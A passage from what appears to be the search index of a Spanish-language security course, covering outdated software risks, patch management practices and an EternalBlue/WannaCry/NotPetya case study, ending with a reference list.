nuevos. De hecho, no es raro encontrar en empresas software antediluviano que, debido a su nula actualizaci\u00f3n, obliga a mantener sistemas operativos e incluso hardware de las mismas caracter\u00edsticas, representando un grave riesgo para la empresa.</p> <p>En el mejor de los casos, esto puede dar lugar a interrupciones en el servicio. </p> <p>En el peor de los casos, se puede sufrir una falla total del sistema. Esto puede suceder, por ejemplo, si el software obsoleto es fundamental para el funcionamiento </p>"},{"location":"segof/servicios_desact/#manteniendo-el-software-saludable","title":"Manteniendo el software \"saludable\"","text":"<p>Por tanto, es importante que los sistemas no funcionen con software obsoleto. Pero, \u00bfc\u00f3mo puede mantenerse saludable y los datos seguros? La respuesta est\u00e1 en updates y upgrades peri\u00f3dicos.</p> <p>Las actualizaciones (updates) a menudo ocurren autom\u00e1ticamente en segundo plano, pero no siempre. Por lo tanto, una buena pr\u00e1ctica es buscar actualizaciones con regularidad y asegurarse de que nuestro software las tenga. Las actualizaciones de software son para el mantenimiento general de su software. Incluyen parchear vulnerabilidades y protegerse contra amenazas cibern\u00e9ticas nuevas.</p> <p>De vez en cuando, necesitar\u00e1 un upgrade para mantener su software en buen estado. Este es un cambio mayor que necesitar\u00e1 algo de atenci\u00f3n. Los upgrades no siempre son necesarios de inmediato. Sin embargo, los proveedores a menudo dejan de brindar soporte (l\u00e9ase: proporcionar actualizaciones) a sus programas m\u00e1s antiguos. Cuando esto suceda, se deber\u00e1 actualizar para evitar el uso de software obsoleto.</p> <p>Cuando sea el momento de un upgrade, debemos asegurarnos de hacer una copia de seguridad de los datos previamente. Tambi\u00e9n se debe verificar la compatibilidad para la integraci\u00f3n del sistema y discutir cualquier inquietud con el proveedor. Esto reduce los riesgos de p\u00e9rdida de datos, interrupci\u00f3n del negocio y una experiencia de actualizaci\u00f3n no adecuada. </p>"},{"location":"segof/servicios_desact/#software-o-sistemas-desactualizados-un-eslabon-debil","title":"Software o sistemas desactualizados: un eslab\u00f3n d\u00e9bil","text":"<p>Cuando se tiene un software obsoleto, no s\u00f3lo se est\u00e1 perdiendo algunas funciones nuevas o un programa un poco ligero o con mayor performance. Tambi\u00e9n est\u00e1 exponiendo su empresa a vulnerabilidades y riesgos de seguridad.</p> <p>Se debe concebir de esta manera: no dejar\u00edamos fruta pasada en el frutero, porque corre el riesgo de que la fruta fresca tambi\u00e9n se eche a perder. Con el software ocurre algo parecido. Por lo tanto, no se debe dejar que el software caduque, se ha de mantener actualizado, seguro y saludable.</p>"},{"location":"segof/servicios_desact/#en-resumen","title":"En resumen","text":"<p>\u00bfActualizaci\u00f3n de sistemas? \u00bfParches de seguridad? \u00bfBoletines de actualizaci\u00f3n? \u00bfEs realmente \u00fatil y necesario perder tiempo y esfuerzo en estas tareas?</p> <p>La respuesta es un rotundo S\u00cd, y nunca se debe dejar de insistir sobre la importancia de mantener todos nuestros sistemas actualizados como m\u00e9todo de prevenci\u00f3n de muchos incidentes de seguridad, como las infecciones por malware. Tanto nuestros sistemas operativos, como los contenidos y p\u00e1ginas web, como los programas que utilizamos para el trabajo, deben estar debidamente actualizados a sus \u00faltimas versiones y con todos los parches de seguridad instalados.</p> <p>Cualquier software desactualizado como un sistema operativo obsoleto, sin soporte por parte del fabricante, as\u00ed como el resto de aplicaciones inform\u00e1ticas que utilizamos, desde herramientas ofim\u00e1ticas, pasando por tu CRM, hasta el software de la web o las apps de los m\u00f3viles, son susceptibles de tener fallos de seguridad o vulnerabilidades.  Los ciberdelincuentes aprovechan estos agujeros para intentar introducirse en nuestros sistemas y as\u00ed:</p> <ul> <li> <p>Obtener informaci\u00f3n sensible y confidencial de nuestra empresa, como cuentas de acceso a otros servicios o bases de datos de clientes o de facturaci\u00f3n</p> </li> <li> <p>Cifrar la informaci\u00f3n del servidor y solicitar un \u00abrescate\u00bb por ella, el tan mencionado ransomware</p> </li> <li> <p>Desconfigurar los sistemas de seguridad de la compa\u00f1\u00eda para espiarnos, robar informaci\u00f3n o atacarnos m\u00e1s adelante</p> </li> <li> <p>Usar nuestros sistemas como plataforma de ataque hacia otros sistemas</p> </li> </ul> <p>El INCIBE posee una infograf\u00eda muy buena a modo de concienciaci\u00f3n sobre las actualizaciones de seguridad que se pasa a reproducir:</p> <p></p> <p>As\u00ed las cosas, se hace esencial y vital hacer uso de una adecuada pol\u00edtica de actualizaciones y/o parcheo, como veremos en la siguiente secci\u00f3n.</p>"},{"location":"segof/servicios_desact/#politicas-de-actualizaciones","title":"Pol\u00edticas de actualizaciones","text":"<p>Ya hemos nombrado los problemas que podr\u00edamos sufrir debido a la presencia de software/sistemas/servicios desactualizados en nuestra red. Es por ello que se debe establecer una adecuada y ajustada pol\u00edtica de actualizaciones con la que suplir estos inconvenientes.</p>"},{"location":"segof/servicios_desact/#el-proceso-de-gestion-de-parches","title":"El proceso de gesti\u00f3n de parches","text":"<p>No es una buena estrategia instalar nuevos parches en el mismo momento en que est\u00e9n disponibles y para todos los activos en el inventario de la organizaci\u00f3n sin considerar el impacto. En cambio, deber\u00eda adoptarse un enfoque m\u00e1s estrat\u00e9gico. La gesti\u00f3n de parches debe implementarse mediante un proceso organizativo detallado que sea rentable y centrado en la seguridad.  </p> <p>Los pasos clave para esta proceso de gesti\u00f3n de parches o actualizaciones incluyen:</p> <ol> <li> <p>Desarrollar un inventario actualizado de todos los sistemas de producci\u00f3n: ya sea trimestral o mensualmente, esta es la \u00fanica forma de monitorizar verdaderamente los activos que existen en su ecosistema. A trav\u00e9s de una gesti\u00f3n de activos exhaustiva, se tendr\u00e1 una visi\u00f3n exacta de los sistemas operativos, los tipos de versi\u00f3n y las direcciones IP que existen, junto con sus ubicaciones geogr\u00e1ficas y sus \"propietarios\" en la organizaci\u00f3n. Como regla general, cuanto mayor sea la frecuencia con la que se actualiza el inventario de activos, m\u00e1s informado se estar\u00e1.</p> </li> <li> <p>Dise\u00f1ar un plan para estandarizar sistemas y sistemas operativos para el mismo tipo de versi\u00f3n: aunque es dif\u00edcil de ejecutar, la estandarizaci\u00f3n del inventario de activos hace que la aplicaci\u00f3n de parches sea m\u00e1s r\u00e1pida y eficiente. Es deseable estandarizar los activos hasta obtener un n\u00famero manejable para que se pueda acelerar el proceso de remediaci\u00f3n a medida que se lanzan nuevos parches. Esto ayudar\u00e1 a los equipos t\u00e9cnicos a ahorrar tiempo dedicado a la reparaci\u00f3n.</p> </li> <li> <p>Hacer una lista de todos los controles de seguridad que existen dentro de la organizaci\u00f3n: realizar un seguimiento de los firewalls, antivirus y herramientas de administraci\u00f3n de vulnerabilidades. Se debe saber d\u00f3nde se encuentran, qu\u00e9 protegen y qu\u00e9 activos est\u00e1n asociados con ellos. </p> </li> <li> <p>Comparar las vulnerabilidades reportadas con el inventario: el uso de una herramienta de administraci\u00f3n de vulnerabilidades para evaluar qu\u00e9 vulnerabilidades existen para qu\u00e9 activos en nuestro ecosistema nos ayudar\u00e1 a comprender el riesgo de seguridad en nuestra organizaci\u00f3n.  </p> </li> <li> <p>Clasificar el riesgo: a trav\u00e9s de las herramientas de administraci\u00f3n de vulnerabilidades, se puede administrar f\u00e1cilmente qu\u00e9 activos se consideran cr\u00edticos para la empresa y, por tanto, priorizar en consecuencia lo que necesita ser remediado con m\u00e1s prisa.</p> </li> <li> <p>\u00a1REALIZAR PRUEBAS! Se deben aplicar los parches a una muestra representativa de activos en un entorno de test. Se han de realizar igualmente pruebas de estr\u00e9s en las m\u00e1quinas para asegurarse de que los parches no causen problemas en el entorno de producci\u00f3n.</p> </li> <li> <p>Aplicar los parches: una vez se haya priorizado lo que debe solucionarse primero, se comienzan a aplicar parches para reducir realmente el riesgo en nuestro entorno. Las herramientas de administraci\u00f3n de vulnerabilidades m\u00e1s avanzadas tambi\u00e9n ofrecen la capacidad de automatizar las partes del proceso de parcheo que requieren mucho tiempo.     Se puede considerar implementar los parches en lotes de activos; aunque ya se habr\u00e1n probado en el entorno de test, es posible que todav\u00eda haya resultados inesperados en producci\u00f3n. </p> </li> <li> <p>Realizar un seguimiento de su progreso: vigilar los activos para asegurarse de que el parcheo se haya realizado correctamente. </p> </li> </ol>"},{"location":"segof/servicios_desact/#buenas-practicas-para-la-gestion-de-parches","title":"Buenas pr\u00e1cticas para la gesti\u00f3n de parches","text":"<p>Mitre establece una serie de t\u00e9cnicas de mitigaci\u00f3n para las actualizaciones de software: MITRE ATT&amp;CK</p> <p>Una serie de pautas muy b\u00e1sicas que podr\u00edamos dar en cuanto a la gesti\u00f3n de parches o actualizaciones de seguridad:</p> <ol> <li> <p>Mantenerse actualizado</p> <p>Los proveedores de software lanzan actualizaciones de software con regularidad, y muchas de ellas se enfocan a problemas de seguridad importantes. Debe haber un responsable para que se encargue de estar al tanto de las actualizaciones de software y de consultar los sitios web de esos proveedores con regularidad. Esa persona tambi\u00e9n debe estar atento a las amenazas emergentes, como nuevos tipos de ransomware u otro tipo de malware.</p> </li> <li> <p>Conocer el programa de actualizaciones de Microsoft</p> <p>En la mayor\u00eda de las peque\u00f1as e incluso grandes empresas con toda probabilidad se estar\u00e1 usando alguno de los productos de Microsoft. Microsoft lanza actualizaciones de software importantes el segundo martes de cada mes. Es importante asegurarse de no esperar demasiado para instalar las actualizaciones necesarias despu\u00e9s de su publicaci\u00f3n. </p> </li> <li> <p>Mantenerse al d\u00eda con las tareas de mantenimiento regulares</p> <p>Debe existir un responsable a cargo de mantener las licencias de software actualizadas y mantener el software actualizado.</p> </li> <li> <p>Desarrollar relaciones con proveedores clave</p> <p>Si se depende en gran medida de uno o m\u00e1s proveedores de software, se ha de intentar realizar una llamada mensual o semanal o, al menos, mantenerse en contacto por correo electr\u00f3nico con el comercial o gerente de la cuenta. Siempre es una buena idea tener relaciones estrechas con los principales proveedores de software, redes y sistemas operativos.</p> </li> <li> <p>Crear un inventario</p> <p>Tal y como se ha comentado con anterioridad, es conveniente realizar una lista de todos sus sistemas de producci\u00f3n. Si es necesario, utilizar esc\u00e1neres de red comerciales y productos de descubrimiento automatizado que puedan ayudar con este proceso. Luego comparar la lista con las nuevas vulnerabilidades de seguridad que se notifiquen y actualizar seg\u00fan sea necesario.</p> </li> <li> <p>Automatizar todo lo que se pueda</p> <p>Automatizar todo lo que sea susceptible de ello contribuir\u00e1 en gran medida a reducir la carga de trabajo. Por ejemplo, muchos paquetes de software vienen con la opci\u00f3n de actualizaciones autom\u00e1ticas.</p> </li> <li> <p>Hacer una copia de seguridad de todo lo que se pueda</p> <p>Nos debemos asegurar de que nuestros datos cr\u00edticos est\u00e9n respaldados en todo momento. Si algo sale mal durante la actualizaci\u00f3n o el parche, nos alegraremos de haberlo hecho. </p> </li> </ol> <p>No obstante, dependiendo de la fuente que se consulte, aparecer\u00e1n unas u otras de estas mejores pr\u00e1cticas , a pesar de haber algunas l\u00edneas generales. Como ejemplo, esta infograf\u00eda bastante actualizada de la empresa de seguridad Secpod:</p> <p></p> <p>Un ejemplo real de una pol\u00edtica de atualizaciones la podemos consultar para la universidad de Berkeley</p>"},{"location":"segof/servicios_desact/#un-caso-real-eternalblue-ms17-010-smbv1-y-wannacry","title":"Un caso real: Eternalblue (MS17-010), SMBv1 y Wannacry","text":""},{"location":"segof/servicios_desact/#que-es-eternalblue","title":"\u00bfQu\u00e9 es EternalBlue?","text":"<p>EternalBlue es tanto el nombre de una serie de vulnerabilidades de software de Microsoft como el exploit creado por la NSA a modo de herramienta de ciberataque. Aunque el exploit EternalBlue, oficialmente nombrado MS17-010 por Microsoft, afecta solo a los sistemas operativos Windows, cualquier cosa que use el protocolo de intercambio de archivos SMBv1 (Server Message Block versi\u00f3n 1), est\u00e1 t\u00e9cnicamente en riesgo de ser blanco de ransomware y otros ciberataques debido a una vulnerabilidad de tipo RCE (Ejecuci\u00f3n Remota de C\u00f3digo).</p> <p>EternalBlue fue creado por la Agencia de Seguridad Nacional de los Estados Unidos (NSA) como parte de una iniciativa m\u00e1s que cuestionable de almacenar y convertir en armas para uso propio las vulnerabilidades del software en lugar de reportarlas al proveedor pertinente, seg\u00fan se condena los comentarios hechos por Microsoft.</p> <p>La NSA supuestamente pas\u00f3 casi un a\u00f1o buscando un error en el software de Microsoft y una vez que lo encontraron, desarroll\u00f3 EternalBlue para explotar la vulnerabilidad. La NSA estuvo usando EternalBlue durante cinco a\u00f1os antes de alertar a Microsoft de su existencia.</p> <p>Desde entonces, Microsoft ha pedido a la NSA y a otros organismos gubernamentales que apoyen una Convenci\u00f3n Digital de Ginebra que exige el fin de la acumulaci\u00f3n de vulnerabilidades de software por los estados-naci\u00f3n.</p>"},{"location":"segof/servicios_desact/#leak-filtracion-inicial","title":"Leak (filtraci\u00f3n) inicial","text":"<p>Aqu\u00ed es donde las cosas se ponen interesantes: la NSA es pirateada y, sin saberlo, esparce la peligrosa amenaza de EternalBlue por el mundo. Poco se sabe oficialmente sobre c\u00f3mo se pirate\u00f3 la NSA.</p> <p>Shadow Brokers, el ahora conocido grupo de hacking, obtuvo acceso a EternalBlue y filtr\u00f3 (junto con muchas otras herramientas para otras vulnerabilidades) el exploit de la NSA el 14 de abril de 2017 a trav\u00e9s de un enlace en su cuenta de Twitter. </p> <p>Algunas de estas vulnerabilidades (CVE-2017-0143, CVE-2017-0144, CVE-2017-0145, CVE-2017-0146, CVE-2017-0147 y CVE-2017-0148), permiten la ejecuci\u00f3n de c\u00f3digo arbitrario de manera remota (Eternalblue + Doublepulsar), en caso de que un atacante (sin necesidad de autenticarse) env\u00ede paquetes espec\u00edficamente creados a un servidor Microsoft Server Message Block 1.0 (SMBv1).</p> <p></p> <p>El 14 de marzo de 2017, casi dos meses antes de la filtraci\u00f3n de Shadow Brokers, Microsoft public\u00f3 el Bolet\u00edn de seguridad MS17-010 . La l\u00ednea de tiempo sugiere que Microsoft recibi\u00f3 un aviso sobre la violaci\u00f3n de la NSA y se apresur\u00f3 a hacer todo lo posible para proteger los millones de sistemas Windows vulnerables.</p> <p>El parche MS17-010 fue dise\u00f1ado para corregir las fallas del software SMBv1 para todos los sistemas operativos Windows compatibles, incluidos Windows Vista, Windows 7, Windows 8.1, Windows 10, Windows Server 2008, Windows Server 2012 y Windows Server 2016 . Microsoft tambi\u00e9n deshabilit\u00f3 autom\u00e1ticamente SMBv1 en las \u00faltimas versiones de Windows 10 y Windows Server 2012 y 2016 de forma predeterminada.</p> <p>Adem\u00e1s, en un movimiento sin precedentes para demostrar la gravedad del exploit EternalBlue, Microsoft lanz\u00f3 un segundo parche de emergencia para sistemas operativos no compatibles una vez que la filtraci\u00f3n se hizo p\u00fablica. Esta segunda versi\u00f3n es compatible con Windows XP, Windows 8 y Windows Server 2003.</p> <p>Esto pone de manifiesto la pobre gesti\u00f3n de las pol\u00edticas de actualizaciones por parte de las empresas, puesto que a pesar de poseer un lapso de dos meses para aplicar el parche de Microsoft, las consecuencias de esta vulnerabilidad fueron funestas, como se ver\u00e1 a continuaci\u00f3n.</p>"},{"location":"segof/servicios_desact/#como-funciona-eternalblue","title":"\u00bfC\u00f3mo funciona EternalBlue?","text":"<p>El exploit EternalBlue funciona aprovechando las vulnerabilidades SMBv1 presentes en versiones anteriores de los sistemas operativos de Microsoft. SMBv1 se desarroll\u00f3 por primera vez a principios de 1983 como un protocolo de comunicaci\u00f3n de red para permitir el acceso compartido a archivos, impresoras y puertos. B\u00e1sicamente, era una forma de que las m\u00e1quinas con Windows se comunicaran entre s\u00ed y con otros dispositivos para servicios remotos.</p> <p>EternalBlue aprovecha las vulnerabilidades de SMBv1 para insertar paquetes de datos maliciosos y propagar malware por la red.</p> <p>El exploit hace uso de la forma en que Microsoft Windows maneja, o m\u00e1s bien \"malmaneja\", paquetes especialmente dise\u00f1ados por atacantes malintencionados. Todo lo que el atacante debe hacer es enviar un paquete creado con fines malintencionados al servidor de destino y boom, el malware se propaga y se produce un ciberataque.</p> <p>El parche de Microsoft cierra la vulnerabilidad de seguridad por completo, evitando as\u00ed los intentos de implementar ransomware, malware, cryptojacking o cualquier otro intento similar a un gusano de infiltraci\u00f3n digital utilizando el exploit EternalBlue. Pero persiste un problema clave: para muchas versiones de Windows, la actualizaci\u00f3n de software debe instalarse para poder brindar protecci\u00f3n.</p> <p>Es este problema clave el que le da a EternalBlue una vida \u00fatil tan larga: muchas personas e incluso empresas no actualizan su software con regularidad, dejando sus sistemas operativos sin parches y, por lo tanto, vulnerables a EternalBlue y otros ataques. Hasta el d\u00eda de hoy, la cantidad de sistemas Windows vulnerables sin parchear sigue siendo de millones.</p> <p>Todo lo expuesto hasta ahora pone de relieve varios de los asuntos clave que nos ocupan en la presente p\u00edldora formativa:</p> <ol> <li> <p>Es muy importante estar al d\u00eda de las nuevas vulnerabilidades y avisos</p> </li> <li> <p>Es importante tener una correcta gesti\u00f3n de los parches de seguridad y aplicarlos con la mayor celeridad, m\u00e1xime si son casos tan graves como estos</p> </li> <li> <p>Es muy importante no utilizar software desactualizado. El servicio SMBv1 tiene casi 30 a\u00f1os de vida, fue dise\u00f1ado para un contexto distinto, con apenas amenazas, ya que 30 a\u00f1os en inform\u00e1tica pueden representan un mundo. Se deber\u00edan haber realizado los mayores esfuerzos posibles para dejar de usarse en el entorno empresarial.</p> </li> <li> <p>Entroncando con el punto anterior, Windows XP recibi\u00f3 el correspondiente parche de seguridad debido a la gravedad del asunto, a pesar de ser un Sistema Operativo fuera de soporte. Esto no es m\u00e1s que la excepci\u00f3n que confirma la regla y lo m\u00e1s probable en cualquier otro caso hubiera sido no recibir parche alguno.     As\u00ed las cosas, resulta esencial el uso de software con el soporte apropiado.</p> </li> </ol> <p></p>"},{"location":"segof/servicios_desact/#como-se-usa-eternalblue-en-ciberataques","title":"\u00bfC\u00f3mo se usa EternalBlue en ciberataques?","text":"<p>EternalBlue se ha utilizado para difundir el ransomware WannaCry y Petya. Pero el exploit se puede utilizar para implementar cualquier tipo de ciberataque, incluido el cryptojacking y el malware similar a un gusano. El hack de la NSA abri\u00f3 la puerta para que cualquier atacante env\u00ede un paquete malicioso a un servidor vulnerable que no ha aplicado el parche para reparar CVE-2017-0144.</p> <p>En 2017, el ransomware WannaCry se convirti\u00f3 en uno de los ciberataques m\u00e1s devastadores jam\u00e1s vistos. Se extendi\u00f3 por todo el mundo, bloqueando sistemas cr\u00edticos en todo el mundo e infectando m\u00e1s de 230,000 ordenadores en m\u00e1s de 150 pa\u00edses en solo un d\u00eda.</p> <p>El Servicio Nacional de Salud (NHS) del Reino Unido, FedEx, Telef\u00f3nica o Renault-Nissan son solo algunos nombres que se convirtieron en v\u00edctimas de alto perfil de los paralizantes ataques del ransomware WannaCry.</p> <p>El ciberataque de WannaCry comenz\u00f3 el 12 de mayo de 2017 e inmediatamente tuvo un impacto global. El ransomware se propag\u00f3 a una velocidad de 10,000 dispositivos por hora, infectando a m\u00e1s de 230,000 PC con Windows en 150 pa\u00edses en un solo d\u00eda.</p> <p></p> <p>Petya es otro ciberataque de ransomware que utiliz\u00f3 el exploit EternalBlue para causar estragos</p> <p>Petya se lanz\u00f3 t\u00e9cnicamente a principios de 2016, antes de WannaCry, pero con poca fanfarria y da\u00f1os. La primera versi\u00f3n de Petya se propag\u00f3 a trav\u00e9s de un archivo adjunto de correo electr\u00f3nico malicioso y era una forma bastante sencilla de ransomware: su computadora se infecta y sus archivos se cifran (o se retienen como rescate) hasta que paga $ 300 en Bitcoin para comprar una clave de descifrado</p> <p>Petya es otra variedad de ransomware que utiliz\u00f3 el exploit EternalBlue para cifrar los archivos y exigir un rescate en Bitcoin para liberarlos.</p> <p>Gracias a EternalBlue y al desafortunado \u00e9xito de WannaCry, el ransomware Petya tuvo una segunda oportunidad de destrucci\u00f3n. En junio de 2017, NotPetya se implement\u00f3 utilizando el exploit EternalBlue.</p> <p>La diferencia clave entre la primera y la segunda versi\u00f3n de Petya fue que NotPetya (Petya V2) ten\u00eda como objetivo desactivar completamente un sistema. Rescate pagado o no, no hab\u00eda cura. El ciberataque cifr\u00f3 permanentemente la tabla de archivos maestra de una computadora (MFT) y el registro de inicio maestro (MBR).</p>"},{"location":"segof/webgrafia/","title":"Webgraf\u00eda","text":"<p>Hackertarget - Nmap Tutorial</p> <p>OWASP - Analysing Networks with NMAP</p> <p>Scripts en Nmap</p> <p>TheHackerWay - T\u00e9cnicas de Recolecci\u00f3n de Informaci\u00f3n \u2013 Scripting con NMAP</p> <p>Cisco - Exploits</p> <p>Securitytrails - Top exploit databases</p> <p>What is exploit-db</p> <p>The security risks of outdated software</p> <p>Patch Management: Benefits and Best Practices</p> <p>Seven best practices for managing software patches and updates</p> <p>WannaCry Ransomware Explained</p> <p>Offense and Defense \u2013 A Tale of Two Sides: (Windows) OS Credential Dumping</p> <p>LM, NTLM, Net-NTLMv2, oh my!</p> <p>Windows Password Hashes</p> <p>Stealing passwords with credential dumping</p> <p>Dumping de credenciales, definici\u00f3n</p>"}]}